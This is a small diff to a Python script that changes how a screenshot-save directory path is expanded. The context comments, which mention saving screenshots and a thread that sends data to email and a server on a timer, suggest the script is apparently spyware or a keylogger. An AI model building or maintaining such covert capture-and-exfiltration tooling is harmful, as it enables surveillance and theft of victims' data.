@@ -22,8 +22,8 @@ if not os.path.exists(log_file):
   	open(log_file, 'w').close()
 
 # Making the directory where screenshots would be saved if it doesn't exits
-if not os.path.exists(f"{data.sspath}/"):
-	os.mkdir(f"{data.sspath}/")
+if not os.path.exists(f"{os.path.expanduser(data.sspath)}/"):
+	os.mkdir(f"{os.path.expanduser(data.sspath)}/")
 
 # A thread to send data to email and server after every time_seconds 
 def email_threading():
